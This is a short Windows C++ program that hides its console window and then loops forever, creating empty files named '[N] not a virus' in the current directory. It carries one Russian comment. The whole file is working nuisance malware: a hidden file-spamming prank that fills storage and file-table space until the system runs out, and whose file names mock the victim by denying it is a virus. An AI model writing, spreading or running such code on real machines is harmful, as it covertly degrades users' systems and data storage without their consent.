#include <iostream>
#include<fstream>
#include<string>
#include<filesystem>
#include<Windows.h>
#include"resource.h"
using std::cout;
using std::ofstream;
using std::to_string;
using namespace std::filesystem;
int main()
{
	setlocale(LC_ALL, "RUSSIAN");
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	ofstream filew;
	int x = 1;
	while (true)
	{
		if (!exists("[" + to_string(x) + "] not a virus "))//если файл не найден!
		{
			filew.open("[" + to_string(x) + "] not a virus "); filew.close();
		}
		x++;
	}
	return 0;
}